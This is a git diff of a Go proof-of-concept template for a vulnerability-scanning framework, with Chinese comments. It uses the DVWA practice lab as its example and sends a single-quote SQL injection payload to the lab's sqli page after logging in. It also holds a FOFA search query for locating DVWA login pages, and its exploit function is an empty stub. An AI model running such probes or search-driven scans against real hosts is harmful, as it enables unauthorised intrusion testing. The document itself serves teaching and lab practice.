@@ -4,13 +4,12 @@ import (
 	"GoPoc/main/Developer/AllFormat"
 	"GoPoc/main/Developer/HttpAbout"
 	"GoPoc/main/User/Utils"
-	"net/http"
 	"strings"
 )
 
 var Json string
-var Poc func(hostInfo string, client *http.Client) bool
-var Exp func(expResult Format.ExpResult, client *http.Client) Format.ExpResult
+var Poc func(hostInfo string) bool
+var Exp func(expResult Format.ExpResult) Format.ExpResult
 
 // Poc 编写,以 dvwa 靶场的sql注入为例
 func init() {
@@ -18,16 +17,16 @@ func init() {
 	// 如果存在代码,可以不写Json格式(即Json格式有架构,但内容为空).但必须存在 fofa语句
 	// 此处的json只是说明json的使用方式,与代码模式并无关联
 	Json = `{
-	"CheckIP":"true",
+	"CheckIP":"false",
 
   	"Coroutine":"10",
 
   	"File":"",
 
-  	"Url":"https://www.baidu.com",
+  	"Url":"127.0.0.1",
 
     "Fofa":"body=\"Login :: Damn Vulnerable Web Application\"",
-    "Uri" : "/dvwa/"  
+    "Uri" : "/dvwa/",
 
     "Request":{
 
@@ -74,11 +73,10 @@ func init() {
 }
 }`
 
-	getSessionByLogin := func(hostInfo string, client *http.Client) (string, error) {
+	getSessionByLogin := func(hostInfo string) (string, error) {
 		// 发起登录请求 --> 302跳转 --> 获取请求包中的session , 并返回
 		config := HttpAbout.NewHttpConfig()
 		config.Uri = "/dvwa/"
-		config.Client = client
 		resp, err := HttpAbout.SendHttpRequest(hostInfo, config)
 		if err != nil {
 			return "", err
@@ -97,11 +95,11 @@ func init() {
 	}
 
 	// 建议: 函数名+随机命名
-	sendLoginByToken455445 := func(hostInfo string, client *http.Client) (Format.CustomResponseFormat, error) {
+	sendLoginByToken455445 := func(hostInfo string) (Format.CustomResponseFormat, error) {
 		var err error
 		var customResponse Format.CustomResponseFormat
 		config := HttpAbout.NewHttpConfig()
-		config.Header["Cookie"], err = getSessionByLogin(hostInfo, client) // (非强制) 自定义Header头
+		config.Header["Cookie"], err = getSessionByLogin(hostInfo) // (非强制) 自定义Header头
 		if err != nil {
 			return customResponse, nil
 		}
@@ -109,37 +107,36 @@ func init() {
 		config.Header["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0" // (非强制) 如果不写的话随机从默认URL列表上选取一个
 		config.TimeOut = 5                                                                                               // (非强制) 如果不写的话默认值为 5秒
 		config.Method = "GET"                                                                                            // (非强制) 如果不写的话默认值为 GET方式
-		//config.Body = `123`       // (非强制) 如果不写的话默认值为 ""
+		//config.Body = `123`       																					// (非强制) 如果不写的话默认值为 ""
 		config.Uri = "/dvwa/index.php" // (非强制) 如果不写的话默认值为 ""
-		config.Client = client         // (强制) 因为这个 client 挂上了burpSuite代理,如果你使用自己的client可能会因为没有挂代理而无法得知利用过程,会不好写poc/exp
+		config.IsRedirect = true       // (非强制) 如果不写的话默认值为 false,即返回的响应包数据为重定向前的响应包
 		return HttpAbout.SendHttpRequest(hostInfo, config)
 	}
 
 	// 建议: 函数名+随机命名
-	sendSqlPayload5251552 := func(hostInfo string, client *http.Client) (Format.CustomResponseFormat, error) {
+	sendSqlPayload5251552 := func(hostInfo string) (Format.CustomResponseFormat, error) {
 		config := HttpAbout.NewHttpConfig()
 		config.Header["Cookie"] = "security=low; PHPSESSID=1abcbe73869e90560e9061ca636c813e"
 		config.Uri = "/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#"
-		config.Client = client
 		return HttpAbout.SendHttpRequest(hostInfo, config)
 	}
 
 	// 如果使用代码模式, Poc函数为必须,其中的参数固定
-	Poc = func(hostInfo string, client *http.Client) bool {
-		resp, err := sendLoginByToken455445(hostInfo, client)
+	Poc = func(hostInfo string) bool {
+		resp, err := sendLoginByToken455445(hostInfo)
 		if err != nil {
 			return false
 		}
 		if !strings.Contains(resp.Body, "Welcome to Damn") {
 			return false
 		}
-		resp, err = sendSqlPayload5251552(hostInfo, client)
+		resp, err = sendSqlPayload5251552(hostInfo)
 		return err == nil && strings.Contains(resp.Body, "You have an error in your SQL syntax;")
 	}
 
 	// 如果使用代码模式, Exp函数为必须,其中的参数固定
 	// Exp 你可以尝试自己写一下:
-	Exp = func(expResult Format.ExpResult, client *http.Client) Format.ExpResult {
+	Exp = func(expResult Format.ExpResult) Format.ExpResult {
 		return expResult
 	}
 }
